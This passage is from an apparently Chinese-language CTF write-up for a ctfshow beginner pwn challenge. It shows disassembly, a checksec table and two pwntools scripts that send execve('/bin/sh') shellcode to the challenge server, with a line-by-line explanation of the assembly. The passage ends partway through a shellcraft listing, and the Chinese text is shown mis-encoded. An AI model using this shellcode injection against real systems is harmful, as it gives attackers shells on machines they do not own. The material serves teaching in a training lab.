</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">F7</span>                 <span class="nv">lea</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">buf</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">FD</span>                 <span class="nv">push</span>    <span class="nb">eax</span>             <span class="c1">; s</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">FE</span>                 <span class="nv">call</span>    <span class="nv">_puts</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">08048503</span>                 <span class="nf">add</span>     <span class="nb">esp</span><span class="p">,</span> <span class="mh">10h</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">08048506</span>                 <span class="nf">lea</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">buf</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">0804850</span><span class="nf">C</span>                 <span class="nv">call</span>    <span class="nb">eax</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">0804850</span><span class="nf">E</span>                 <span class="nv">nop</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">0804850</span><span class="nf">F</span>                 <span class="nv">mov</span>     <span class="nb">ebx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var_4</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">08048512</span>                 <span class="nf">leave</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">08048513</span>                 <span class="nf">retn</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">08048513</span> <span class="c1">; } // starts at 80484C6</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">08048513</span> <span class="nf">ctfshow</span>         <span class="nv">endp</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">08048513</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">08048514</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">08048514</span> <span class="c1">; =============== S U B R O U T I N E =======================================</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™ä»£ç æ˜¯åœ¨çœ‹ä¸æ‡‚å¯ä»¥ä¸ŠAIå—¦ä¸€ä¸‹ï¼Œè®©å®ƒå¸®ä½ è§£æä¸€ä¸‹ï¼Œæ¯•ç«Ÿåˆšå…¥é—¨&hellip;&hellip;ï¼ˆè¿™æ®µä»£ç æ˜¯ IDA åç¼–è¯‘å‡ºçš„ 32 ä½ x86 æ¶æ„ç¨‹åºä¸­<code>ctfshow</code>å‡½æ•°ï¼‰</p>
<p>checksecä¸€ä¸‹ï¼šè®°ä½ä¸Šé¢çš„å‚æ•°ï¼Œåé¢å†™expè¦ç”¨&hellip;</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/62.png"
	width="675"
	height="180"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/62_hu_384015e3cc48e.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/62_hu_8910832fcad885ea.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="375"
		data-flex-basis="900px"
	
></p>
<p>å¯çŸ¥ï¼Œå¯¹è¿™äº›ä¿æŠ¤æœ‰ç‚¹é—å¿˜çš„å¯ä»¥å›å»çœ‹<a class="link" href="https://expl0rer.top/p/pwn-1/#linux%e5%ae%89%e5%85%a8%e9%98%b2%e6%8a%a4%e6%9c%ba%e5%88%b6"  target="_blank" rel="noopener"
    >PWN-1çš„Linuxå®‰å…¨ä¿æŠ¤æœºåˆ¶</a></p>
<div class="table-wrapper"><table>
  <thead>
      <tr>
          <th>ä¿æŠ¤é¡¹</th>
          <th>çŠ¶æ€</th>
          <th>å¯¹åˆ©ç”¨çš„å½±å“</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>Arch</td>
          <td>i386-32-Little</td>
          <td>32 ä½ x86 æ¶æ„ï¼Œshellcode éœ€ç”¨ 32 ä½ç‰ˆæœ¬ï¼ˆå¯¹åº”<code>shellcraft.i386.sh()</code>ï¼‰</td>
      </tr>
      <tr>
          <td>Canaryï¼ˆæ ˆæº¢å‡ºä¿æŠ¤ï¼‰</td>
          <td>No canary found</td>
          <td>æ— æ ˆæº¢å‡ºä¿æŠ¤ï¼Œç¼“å†²åŒºæº¢å‡ºåå¯ç›´æ¥è¦†ç›–æ ˆä¸Šæ•°æ®ï¼ˆæ— éœ€ç»•è¿‡ canaryï¼‰</td>
      </tr>
      <tr>
          <td>NXï¼ˆæ ˆä¸å¯æ‰§è¡Œï¼‰</td>
          <td>NX disabled</td>
          <td>æ ˆæ®µå¯æ‰§è¡Œï¼Œshellcode ç›´æ¥æ”¾åœ¨æ ˆä¸Šå°±èƒ½è¿è¡Œï¼ˆæ— éœ€ ROP ç»•è¿‡ NXï¼‰</td>
      </tr>
      <tr>
          <td>PIEï¼ˆåœ°å€éšæœºåŒ–ï¼‰</td>
          <td>No PIE (0x8048000)</td>
          <td>ç¨‹åºåœ°å€å›ºå®šï¼Œ<code>ctfshow</code>å‡½æ•°ã€<code>buf</code>ç¼“å†²åŒºåœ°å€ä¸ä¼šå˜ï¼ˆæ— éœ€æ³„éœ²åœ°å€ï¼‰</td>
      </tr>
      <tr>
          <td>RWX segments</td>
          <td>Has RWX segments</td>
          <td>å­˜åœ¨ â€œå¯è¯»å¯å†™å¯æ‰§è¡Œâ€ çš„å†…å­˜æ®µï¼Œè¿›ä¸€æ­¥ç¡®ä¿ shellcode èƒ½æ­£å¸¸æ‰§è¡Œ</td>
      </tr>
  </tbody>
</table></div>
<p><strong>æ€»ç»“</strong>ï¼šç¨‹åºä¿æŠ¤æœºåˆ¶æå¼±ï¼Œç›´æ¥ç”¨ â€œæ ˆæº¢å‡ºæ³¨å…¥ shellcodeâ€ å³å¯ï¼Œæ— éœ€å¤æ‚ç»•è¿‡ã€‚</p>
<p>å›åˆ°æœ¬é¢˜ç›®ï¼Œåœ¨ncè¿æ¥ä¹‹åäº¤äº’ä¸€ä¼šå‘ç°å¹¶æ— å®é™…æ•ˆæœï¼ŒPWNå¤§è‡´æ€è·¯æ˜¯æ‰¾åˆ°åé—¨å‡½æ•°æˆ–è€…ç³»ç»Ÿè°ƒç”¨å‡½æ•°è¿›è¡Œ<code>ææƒ</code>ï¼Œææƒä¹‹åå°±è¿›è¡Œäº¤äº’å»æ‰§è¡Œä¸€äº›é¶æœºçš„ç»ˆç«¯å‘½ä»¤ä¾‹å¦‚ï¼šcat ctfshow_flagã€lsä¹‹ç±»çš„ã€‚é‚£åœ¨æ­¤ä¹‹å‰éƒ½å¾—å…ˆæ‰¾åˆ°è¿™â€œåé—¨â€ï¼Œä¹Ÿå°±æ˜¯/bin/shã€zshã€systemå‡½æ•°ç­‰ç­‰ï¼Œä½†æˆ‘å‘ç°è¿™ä¸ªç¨‹åºå¹¶æ— è¿™äº›åœ°å€å­˜åœ¨ï¼Œæ‰€ä»¥è¯´è¿™ä¸ªç¨‹åºä»è¢«åˆ¶é€ å‡ºæ¥éƒ½æ²¡æƒ³è¿‡è¦æ‰§è¡Œè¿™äº›æœ‰å…³ææƒçš„ä»£ç &hellip;..</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/66.png"
	width="1650"
	height="625"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/66_hu_da2faac4b22ea10b.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/66_hu_a3ee0bccff8fa056.png 1024w"
	loading="lazy"
	
		alt="å…¨ç¯‡æœç´¢/bin/shå­—ç¬¦ä¸²"
	
	
		class="gallery-image" 
		data-flex-grow="264"
		data-flex-basis="633px"
	
></p>
<p>å› ä¸ºNXã€canaryæ²¡å¼€ã€åˆæœ‰RWXï¼Œæ³¨å…¥ä¸€æ®µæˆ‘ä»¬è®¾è®¡çš„æœ‰å…³æ‰§è¡Œ/bin/shçš„expè¿˜æ˜¯å¯ä»¥çš„ï¼Œå¤§è‡´æ€è·¯æœ‰äº†ï¼Œæ¥ä¸‹æ¥å¼€å§‹æ‰§è¡Œå§ã€‚</p>
<p><strong>å›´ç»• â€œç›´æ¥æ‰§è¡Œ shellcodeâ€ è®¾è®¡æ–¹æ¡ˆ</strong></p>
<p>å¯ä»¥ç”¨pwntoolsçš„è„šæœ¬å•Šï¼Œå•çº¯ç›´æ¥è°ƒç”¨å‡½æ•°çš„ï¼Œè€Œä¸”pwntoolsæœ‰å±€é™å•Šï¼Œå°±é‚£ç”¨è¿™ä¸ªpwntoolsçš„shellcraftæ¨¡å—ç”Ÿæˆçš„shellcodeæ¯”è¾ƒæ™¦æ¶©éš¾æ‡‚ï¼Œè€Œä¸”æ³¨é‡Šæ”¾åˆ°Kaliä¸Šæ¯”è¾ƒæ‚ä¹±ï¼Œè€Œä¸”æ²¡æœ‰æ¶‰åŠåˆ°æ±‡ç¼–è¯­è¨€è°ƒç”¨ï¼Œæ¯”è¾ƒç®€å•æˆ‘å°±ä¸ç”¨äº†ï¼Œæˆ‘è¿™é‡Œæ‰‹æ•²shellcodeæ–¹ä¾¿å¤§å®¶äº†è§£ä¸€ä¸‹åº•å±‚é€»è¾‘ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span> <span class="c1"># å¯¼å…¥ pwntools åº“</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span> <span class="c1"># è®¾ç½®æ—¥å¿—çº§åˆ«ä¸ºè°ƒè¯•æ¨¡å¼</span>
</span></span><span class="line"><span class="cl"><span class="c1">#io = process(&#39;./pwn&#39;) # æœ¬åœ°è¿æ¥</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;pwn.challenge.ctf.show&#34;</span><span class="p">,</span> <span class="mi">28176</span><span class="p">)</span> <span class="c1"># è¿œç¨‹è¿æ¥</span>
</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span>
</span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">mov eax, 0xb      
</span></span></span><span class="line"><span class="cl"><span class="s1">mov ecx, 0       
</span></span></span><span class="line"><span class="cl"><span class="s1">mov edx, 0       
</span></span></span><span class="line"><span class="cl"><span class="s1">push 0x0068732f  
</span></span></span><span class="line"><span class="cl"><span class="s1">push 0x6e69622f   
</span></span></span><span class="line"><span class="cl"><span class="s1">mov ebx, esp    
</span></span></span><span class="line"><span class="cl"><span class="s1">int 0x80         
</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span><span class="p">)</span> <span class="c1"># ç”Ÿæˆä¸€ä¸ª Shellcode</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span> <span class="c1"># å°†ç”Ÿæˆçš„ Shellcode å‘é€åˆ°ç›®æ ‡</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>åˆ›å»ºä¸€ä¸ªpythonæ–‡ä»¶ï¼Œè¾“å…¥è¿™äº›ä»£ç æ”¾åˆ°ç»ˆç«¯ä¸Šè¿è¡Œï¼Œè®°å¾—æå‰æ‰“å¼€å¦å¤–ä¸€ä¸ªçª—å£è¿›è¡Œncè¿æ¥è¿œç¨‹é¶æœºã€‚</p>
<p>ä¸Šé¢å…¶å®ƒçš„pythonä»£ç æ²¡å•¥å¯è®²çš„ï¼Œè¿™æ˜¯è¿œç¨‹äº¤äº’çš„æ¨¡æ¿ä»£ç ï¼Œç›´æ¥å¥—å°±å¥½ï¼Œæˆ‘ç°åœ¨é‡åœ¨è®²è§£è¿™ä¸ªæ‰‹æ“çš„shellcodeï¼Œå®ƒå’Œshellcraftæ¨¡å—äº§ç”Ÿçš„shellcodeæ•ˆæœä¸€æ ·çš„ï¼Œè€Œä¸”è¿˜å¥½çœ‹æ‡‚ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="mh">0xb</span>      <span class="c1">; syscallå·ï¼š11å¯¹åº”execve</span>
</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="mi">0</span>        <span class="c1">; argvå‚æ•°ä¸ºNULL</span>
</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span> <span class="mi">0</span>        <span class="c1">; envpå‚æ•°ä¸ºNULL</span>
</span></span><span class="line"><span class="cl">    <span class="nf">push</span> <span class="mh">0x0068732f</span>   <span class="c1">; å‹æ ˆå­—ç¬¦ä¸²&#34;/sh\0&#34;ï¼ˆå°ç«¯åºå­˜å‚¨ï¼‰</span>
</span></span><span class="line"><span class="cl">    <span class="nf">push</span> <span class="mh">0x6e69622f</span>   <span class="c1">; å‹æ ˆå­—ç¬¦ä¸²&#34;/bin&#34;ï¼ˆå°ç«¯åºå­˜å‚¨ï¼‰</span>
</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">esp</span>      <span class="c1">; ebxæŒ‡å‘æ ˆé¡¶çš„&#34;/bin/sh&#34;å­—ç¬¦ä¸²åœ°å€</span>
</span></span><span class="line"><span class="cl">    <span class="nf">int</span> <span class="mh">0x80</span>          <span class="c1">; è§¦å‘ç³»ç»Ÿè°ƒç”¨</span>
</span></span></code></pre></td></tr></table>
</div>
</div><blockquote class="alert alert-note">
    <blockquote>
<p>è¿™ 7 è¡Œä»£ç é€šè¿‡ç²¾å‡†è®¾ç½®å¯„å­˜å™¨å’Œæ ˆæ•°æ®ï¼Œå®Œæˆäº†<code>execve</code>ç³»ç»Ÿè°ƒç”¨çš„å‚æ•°å‡†å¤‡ï¼Œæœ€ç»ˆå®ç° â€œç”¨<code>/bin/sh</code>æ›¿æ¢å½“å‰è¿›ç¨‹â€ çš„æ•ˆæœï¼Œæ˜¯ CTF ä¸­è·å– shell çš„åŸºç¡€æ‰‹æ®µï¼Œé€»è¾‘æ¸…æ™°ä¸”ç²¾ç®€ï¼ˆä»… 23 å­—èŠ‚ï¼‰ã€‚</p>
</blockquote></blockquote>
<h4 id="é€è¡Œè§£ææ‰‹æ•²shellcode">é€è¡Œè§£ææ‰‹æ•²shellcode
</h4><p>æ€è·¯ï¼šæ³¨å…¥ä¸€æ®µèƒ½æ‰§è¡Œ/bin/shçš„æ±‡ç¼–è¯­è¨€ä»£ç </p>
<p>â‘  <code>mov eax, 0xb</code></p>
<ul>
<li><code>eax</code>å¯„å­˜å™¨åœ¨ 32 ä½ Linux ç³»ç»Ÿè°ƒç”¨ä¸­ä¸“é—¨ç”¨äºä¼ é€’ â€œç³»ç»Ÿè°ƒç”¨å·â€ï¼ˆå‘Šè¯‰å†…æ ¸è¦æ‰§è¡Œå“ªä¸ªç³»ç»Ÿè°ƒç”¨ï¼‰ã€‚</li>
<li><code>0xb</code>æ˜¯åå…­è¿›åˆ¶ï¼Œè½¬æ¢ä¸ºåè¿›åˆ¶æ˜¯<code>11</code>ï¼Œè€Œ<code>11</code>æ­£æ˜¯<code>execve</code>ç³»ç»Ÿè°ƒç”¨å¯¹åº”çš„ç¼–å·ï¼ˆå†…æ ¸é€šè¿‡è¿™ä¸ªå€¼è¯†åˆ«è¦æ‰§è¡Œ<code>execve</code>ï¼‰ã€‚</li>
</ul>
<p>â‘¡ <code>mov ecx, 0</code></p>
<ul>
<li><code>ecx</code>å¯„å­˜å™¨ç”¨äºä¼ é€’<code>execve</code>çš„ç¬¬äºŒä¸ªå‚æ•°<code>argv</code>ï¼ˆå‚æ•°åˆ—è¡¨ï¼‰ã€‚</li>
<li>ä¼ <code>0</code>ï¼ˆå³<code>NULL</code>ï¼‰è¡¨ç¤º â€œæ²¡æœ‰å‚æ•°â€ï¼Œç­‰ä»·äºåœ¨å‘½ä»¤è¡Œç›´æ¥è¾“å…¥<code>/bin/sh</code>ï¼ˆä¸å¸¦ä»»ä½•å‚æ•°ï¼‰ã€‚</li>
</ul>
<p>â‘¢ <code>mov edx, 0</code></p>
<ul>
<li><code>edx</code>å¯„å­˜å™¨ç”¨äºä¼ é€’<code>execve</code>çš„ç¬¬ä¸‰ä¸ªå‚æ•°<code>envp</code>ï¼ˆç¯å¢ƒå˜é‡åˆ—è¡¨ï¼‰ã€‚</li>
<li>ä¼ <code>0</code>ï¼ˆå³<code>NULL</code>ï¼‰è¡¨ç¤º â€œæ²¡æœ‰ç¯å¢ƒå˜é‡â€ï¼Œå†…æ ¸ä¼šä½¿ç”¨é»˜è®¤ç¯å¢ƒå˜é‡ã€‚</li>
</ul>
<p>â‘£ <code>push 0x0068732f</code></p>
<ul>
<li>
<p><code>push</code>æŒ‡ä»¤å°†æ•°æ®å‹å…¥æ ˆä¸­ï¼ˆæ ˆæ˜¯å‘ä¸‹å¢é•¿çš„å†…å­˜åŒºåŸŸï¼‰ã€‚</p>
</li>
<li>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x0068732f</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>æ˜¯åå…­è¿›åˆ¶çš„ â€œå°ç«¯åºâ€ å­˜å‚¨ï¼ˆx86 æ¶æ„é»˜è®¤å°ç«¯åºï¼Œå³ä½åœ°å€å­˜ä½ä½å­—èŠ‚ï¼‰ï¼Œè½¬æ¢ä¸º ASCII ç ï¼š</p>
<ul>
<li><code>0x2f</code> â†’ <code>/</code></li>
<li><code>0x73</code> â†’ <code>s</code></li>
<li><code>0x68</code> â†’ <code>h</code></li>
<li><code>0x00</code> â†’ å­—ç¬¦ä¸²ç»“æŸç¬¦<code>\0</code>
æ‰€ä»¥è¿™è¡Œå®é™…æ˜¯å¾€æ ˆä¸Šå‹å…¥å­—ç¬¦ä¸²<code>&quot;/sh\0&quot;</code>ã€‚</li>
</ul>
</li>
</ul>
<p>â‘¤ <code>push 0x6e69622f</code></p>
<ul>
<li>
<p>åŒæ ·æ˜¯å‹æ ˆæ“ä½œï¼Œ<code>0x6e69622f</code>è½¬æ¢ä¸º ASCII ç ï¼š</p>
<ul>
<li><code>0x2f</code> â†’ <code>/</code></li>
<li><code>0x62</code> â†’ <code>b</code></li>
<li><code>0x69</code> â†’ <code>i</code></li>
<li><code>0x6e</code> â†’ <code>n</code>
æ‰€ä»¥è¿™è¡Œå¾€æ ˆä¸Šå‹å…¥å­—ç¬¦ä¸²<code>&quot;/bin&quot;</code>ã€‚</li>
</ul>
<p>ç»“åˆä¸Šä¸€è¡Œï¼Œæ ˆä¸Šç°åœ¨çš„å†…å®¹æ˜¯<code>&quot;/bin/sh\0&quot;</code>ï¼ˆå› ä¸ºæ ˆå…ˆå‹å…¥<code>&quot;/bin&quot;</code>ï¼Œå†å‹å…¥<code>&quot;/sh\0&quot;</code>ï¼Œæ ˆé¡¶åˆ°æ ˆåº•çš„é¡ºåºå°±æ˜¯<code>/b/i/n//s/h/\0</code>ï¼‰ã€‚</p>
</li>
</ul>
<p>â‘¥ <code>mov ebx, esp</code></p>
<ul>
<li><code>esp</code>æ˜¯æ ˆæŒ‡é’ˆå¯„å­˜å™¨ï¼Œæ°¸è¿œæŒ‡å‘å½“å‰æ ˆé¡¶çš„åœ°å€ã€‚</li>
<li>ç»è¿‡ä¸¤æ¬¡<code>push</code>åï¼Œæ ˆé¡¶æ­£å¥½æ˜¯<code>&quot;/bin/sh\0&quot;</code>å­—ç¬¦ä¸²çš„èµ·å§‹åœ°å€ï¼ˆç¬¬ä¸€ä¸ªå­—ç¬¦<code>'/'</code>çš„ä½ç½®ï¼‰ã€‚</li>
<li>è¿™è¡ŒæŒ‡ä»¤å°†æ ˆé¡¶åœ°å€å­˜å…¥<code>ebx</code>ï¼Œè€Œ<code>ebx</code>å¯„å­˜å™¨åœ¨<code>execve</code>ç³»ç»Ÿè°ƒç”¨ä¸­ç”¨äºä¼ é€’ç¬¬ä¸€ä¸ªå‚æ•°<code>filename</code>ï¼ˆç¨‹åºè·¯å¾„ï¼‰ï¼Œæ‰€ä»¥<code>ebx</code>ç°åœ¨æŒ‡å‘æˆ‘ä»¬è¦æ‰§è¡Œçš„<code>&quot;/bin/sh&quot;</code>ã€‚</li>
</ul>
<p>â‘¦ <code>int 0x80</code></p>
<ul>
<li><code>int</code>æ˜¯ä¸­æ–­æŒ‡ä»¤ï¼Œ<code>0x80</code>æ˜¯ Linux ç³»ç»Ÿè°ƒç”¨çš„ä¸­æ–­å·ã€‚</li>
<li>æ‰§è¡Œè¿™æ¡æŒ‡ä»¤ä¼šè§¦å‘ä¸€ä¸ªè½¯ä¸­æ–­ï¼Œè®© CPU ä»ç”¨æˆ·æ€åˆ‡æ¢åˆ°å†…æ ¸æ€ï¼Œå†…æ ¸ä¼šæ ¹æ®<code>eax</code>ä¸­çš„ç³»ç»Ÿè°ƒç”¨å·ï¼ˆ<code>11</code>ï¼‰æ‰§è¡Œ<code>execve</code>ï¼Œå¹¶ä½¿ç”¨<code>ebx</code>ã€<code>ecx</code>ã€<code>edx</code>ä¸­çš„å‚æ•°ã€‚</li>
</ul>
<p>æ€»ä¹‹ï¼šå¿…é¡»è¦å®šä¹‰å¥½è¿™å‡ ä¸ªå¯„å­˜å™¨ï¼Œåœ¨æœ€åº•å±‚æ“ä½œç³»ç»Ÿè¿è¡Œæ—¶éƒ½ä¼šç”¨åˆ°çš„ï¼Œè¿™é‡Œä¸è¯¦ç»†è®²è¿°ï¼Œåæ­£ä½ çŸ¥é“è¿™å‡ ä¸ªå¯„å­˜å™¨ä¸€å¼€å§‹å°±å¾—è¿™ä¹ˆå®šä¹‰å°±å¥½å•¦ã€‚ï¼ˆä¸è€çƒ¦äº†ï¼‰</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="mh">0xb</span>      
</span></span><span class="line"><span class="cl"><span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="mi">0</span>       
</span></span><span class="line"><span class="cl"><span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span> <span class="mi">0</span>        
</span></span></code></pre></td></tr></table>
</div>
</div><p>pushå‹æ ˆæ—¶è¦è®°å¾—å­—èŠ‚é™åˆ¶ï¼Œå› ä¸ºæ¶æ„æ˜¯x32ï¼Œæ‰€ä»¥pushæœ€å¤š4ä¸ªå­—èŠ‚ï¼Œä¹Ÿå°±æ˜¯pushä¸¤ä¸ªï¼š/binã€/shçš„åœ°å€ï¼ˆä¸æ»¡å››ä¸ªå­—èŠ‚å¦‚/shè¦è®°å¾—ç”¨00å¡«æ»¡å“¦ä¸ç„¶ä¼šæŠ¥é”™ï¼‰</p>
<p>ç„¶åå°±æ˜¯è®°å¾—espå¯„å­˜å™¨æ˜¯åŠ¨æ€çš„&hellip;</p>
<p>è¿™æ˜¯è°ƒç”¨pwntoolsçš„shellcraftæ¨¡å—çš„expï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>  <span class="c1"># è®¾ç½®æ—¥å¿—çº§åˆ«ä¸ºdebugï¼Œä¼šè¾“å‡ºè¯¦ç»†çš„äº¤äº’è¿‡ç¨‹</span>
</span></span><span class="line"><span class="cl"><span class="c1">#io = process(&#39;./pwn&#39;)  # æœ¬åœ°è°ƒè¯•æ—¶å¯ç”¨ï¼Œç”¨äºå¯åŠ¨æœ¬åœ°çš„pwnç¨‹åº</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;pwn.challenge.ctf.show&#34;</span><span class="p">,</span> <span class="mi">28183</span><span class="p">)</span>  <span class="c1"># è¿æ¥è¿œç¨‹ç›®æ ‡æœåŠ¡ï¼Œåœ°å€ä¸ºpwn.challenge.ctf.showï¼Œç«¯å£28183</span>
</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">sh</span><span class="p">())</span>  <span class="c1"># ç”Ÿæˆä¸€ä¸ªæ‰§è¡Œ/bin/shçš„shellcode</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>  <span class="c1"># å°†shellcodeå‘é€ç»™ç›®æ ‡æœåŠ¡</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>  <span class="c1"># è¿›å…¥äº¤äº’æ¨¡å¼ï¼Œå…è®¸ç”¨æˆ·ä¸ç›®æ ‡æœåŠ¡è¿›è¡Œäº¤äº’ï¼ˆå¦‚æ‰§è¡Œå‘½ä»¤ï¼‰</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™æ˜¯å®ƒçš„shellcodeï¼ˆåŸç‰ˆæœªä¿®æ”¹è¿‡ï¼Œç›´æ¥å¤åˆ¶ç²˜è´´ä¸Šæ¥çš„ï¼‰ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">        /* execve<span class="o">(</span><span class="nv">path</span><span class="o">=</span><span class="s1">&#39;/bin///sh&#39;</span>, <span class="nv">argv</span><span class="o">=[</span><span class="s1">&#39;sh&#39;</span><span class="o">]</span>, <span class="nv">envp</span><span class="o">=</span>0<span class="o">)</span> */
</span></span><span class="line"><span class="cl">        /* push b<span class="s1">&#39;/bin///sh\x00&#39;</span> */
</span></span><span class="line"><span class="cl">        push 0x68
</span></span><span class="line"><span class="cl">        push 0x732f2f2f
</span></span><span class="line"><span class="cl">        push 0x6e69622f
</span></span><span class="line"><span class="cl">        mov ebx, esp
</span></span><span class="line"><span class="cl">        /* push argument array <span class="o">[</span><span class="s1">&#39;sh\x00&#39;</span><span class="o">]</span> */
</span></span><span class="line"><span class="cl">        /* push <span class="s1">&#39;sh\x00\x00&#39;</span> */
</span></span><span class="line"><span class="cl">        push 0x1010101
